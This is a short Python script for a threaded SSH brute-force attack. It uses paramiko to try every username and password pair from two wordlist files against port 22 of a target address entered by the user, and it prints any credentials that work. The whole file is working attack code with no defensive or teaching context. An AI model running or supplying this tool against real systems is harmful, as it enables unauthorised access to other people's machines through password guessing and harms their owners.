import paramiko, sys, os, termcolor
import threading, time

stop_flag = False

def ssh_connect(username, password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = True
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
    except paramiko.ssh_exception.AuthenticationException as e:
        print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For Account: ' + username), 'red'))
    
    #except:
    #    pass
        #print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For Account: ' + username), 'red'))
    #ssh.close()

host = input('[+] Target Address: ')
usernames_file = "usernames.txt"
passwords_file = "passwords.txt"
print('\n')

if os.path.exists(passwords_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + usernames_file + '* * *') 

with open(usernames_file, 'r') as users:
    for username in users:
        username = username.strip()
        with open(passwords_file, 'r') as passwords:
            for password in passwords:
                password = password.strip()
                if stop_flag:
                    break
                t = threading.Thread(target=ssh_connect, args=(username, password))
                t.start()
                time.sleep(0)
                if stop_flag:
                    break
        if stop_flag:
            break


